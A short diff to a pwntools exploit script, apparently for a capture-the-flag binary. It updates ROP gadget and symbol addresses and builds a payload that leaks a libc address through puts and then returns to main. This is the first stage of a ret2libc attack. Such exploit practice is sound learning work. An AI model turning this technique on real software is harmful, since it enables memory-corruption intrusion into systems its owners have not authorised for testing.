@@ -39,16 +39,16 @@ if args.debugger:
   else:
     gdb.attach(p) # if in vagrant just run gdb and attach it.
 
-pop_rdi = 0x0000000000400603
-puts_in_got = 0x400440
+pop_rdi = 0x00000000004006a3
+puts_in_got = 0x4004b0
 got_addr = 0x600ff0 # libc_start_main addr
-main = 0x400556
+main = 0x4005d6
 
 p.recvuntil(':\n')
 
 payload = p64(pop_rdi)
 payload += p64(got_addr)
-payload += p64(0x400440)
+payload += p64(puts_in_got)
 payload += p64(main)
 p.send(payload)
 
